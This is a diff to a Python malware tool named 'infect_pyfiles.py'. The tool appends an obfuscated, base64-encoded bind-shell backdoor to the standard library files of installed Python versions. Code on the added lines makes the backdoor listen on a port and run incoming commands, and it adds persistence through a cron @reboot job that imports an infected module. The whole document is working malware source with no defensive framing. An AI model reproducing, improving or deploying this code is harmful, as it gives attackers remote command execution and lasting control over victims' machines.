@@ -5,7 +5,7 @@ from glob import glob
 from platform import system
 from re import search
 from base64 import b64encode, b64decode
-
+from subprocess import run, PIPE
 # compile with:
 # pyinstaller --onefile --noconsole infect_pyfiles.py
 
@@ -16,56 +16,79 @@ class Infector:
     def __init__(self):
         self.SYSTEM:str = system()
         self.IP:str = "0.0.0.0"
-        self.PORT:int = 1
-        self.dont_target:tuple = (
-            "socket.py",
-            "subprocess.py",
-            "os.py",
-            "sys.py"
-        )
+        self.PORT:int = 1025
 
     def infect_file(self, target_file:str):
         """Infects Python file with malicious Python code to create
         backdoor whenever the victim imports a commonly 
         utilized Python module
         """
-        backdoor:bytes = b"import socket"
-        backdoor += b"\nfrom subprocess import run"
-        backdoor += b"\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:"
-        backdoor += b"\n\tprint(\"INFECTED\")"
+        backdoor:bytes = b"from socket import socket, AF_INET, SOCK_STREAM"
+        backdoor += b"\nfrom subprocess import run, PIPE"
+        backdoor += b"\nfrom threading import Thread"
+        backdoor += b"\nfrom os import _exit"
+        backdoor += b"\ndef serve():"
+        backdoor += b"\n\twith socket(AF_INET, SOCK_STREAM) as soc:"
+        backdoor += bytes(f"\n\t\tsoc.bind((\"{self.IP}\", {self.PORT}))", "utf-8")
+        backdoor += b"\n\t\tsoc.listen(5)"
+        backdoor += b"\n\t\tconn, _ = soc.accept()"
+        backdoor += b"\n\t\twhile True:"
+        backdoor += b"\n\t\t\tcmd = conn.recv(1024).decode(\"utf-8\").strip()"
+        backdoor += b"\n\t\t\tcmd_output = run(cmd.split(), stdout=PIPE, stderr=PIPE)"
+        backdoor += b"\n\t\t\tif cmd_output.returncode == 0:"
+        backdoor += b"\n\t\t\t\tconn.send(bytes(cmd_output.stdout))"
+        backdoor += b"\n\t\t\telse: continue"
+        backdoor += b"\nt = Thread(target=serve)"
+        backdoor += b"\nt.start()"
+        backdoor += b"\nt.join()"
         backdoor_base64:bytes = b64encode(backdoor)
         payload = (
-            "\n"*20 + "from base64 import b64decode;exec(b64decode('{}'))\n".format(backdoor_base64.decode())
+            "\n"*2 + "from base64 import b64decode;exec(b64decode('{}'))\n".format(backdoor_base64.decode())
         )
         with open(target_file, "a") as f:
             f.write(payload)
+        self.PORT += 1
 
     def start_infecting(self):
         """Begin scanning for Python files and infect each one"""
-        # for testing 
-        directory:str = "./samples"
-        #-------------------------------
-        #directory:str = self.python_dir
-        #-------------------------------
-        for root, _, _ in walk(directory):
-            divider:str = "/" if self.SYSTEM == "Linux" else "\\"
-            for file_ in glob(root+divider+"*.py"):
-                if file_ == root+divider+__file__: continue
-                self.infect_file(file_) 
+        # for testing use the samples directory in current directory 
+        # comment out the line below for actual impact 
+        self.python_dirs:str = ["./samples"]
+        for py_dir in self.python_dirs:
+            for root, _, _ in walk(py_dir):
+                divider:chr = "/" if self.SYSTEM == "Linux" else "\\"
+                for file_ in glob(root+divider+"*.py"):
+                    if file_ == root+divider+__file__: continue
+                    elif "subprocess.py" in file_: continue
+                    elif "os.py" in file_: continue
+                    elif "socket.py" in file_: continue
+                    elif "sys.py" in file_: continue
+                    else: self.infect_file(file_) 
         
+    def create_job(self):
+        if self.SYSTEM == "Linux":
+            run(
+                "echo 'python3 -c \"import random\"' > $HOME/.update.sh",
+                shell=True, stdout=PIPE, stderr=PIPE
+            )
+            run(
+                "(crontab -l ; echo \"@reboot $HOME/.update.sh\")| crontab -",
+                shell=True, stdout=PIPE, stderr=PIPE
+            )
+
     def get_python_dirs(self):
         """Get default Python directory"""
         pattern:str = "\d{2}-\d{2}$" if self.SYSTEM == "Windows" else "\d\.\d$"
+        self.python_dirs = []
         for p in path:
             if search(pattern, p):
-               self.python_dir:str = p
-        # REMEMBER TO MODIFY THIS TO RETURN A LIST WITH ALL VALID MATCHES
-        # BECAUSE THERE COULD BE OTHER PYTHON VERSIONS INSTALLED 
+                self.python_dirs.append(p)
 
 def main():
     infector = Infector()
     infector.get_python_dirs()
     infector.start_infecting() 
+    infector.create_job()
     
 if __name__ == "__main__":
     main()
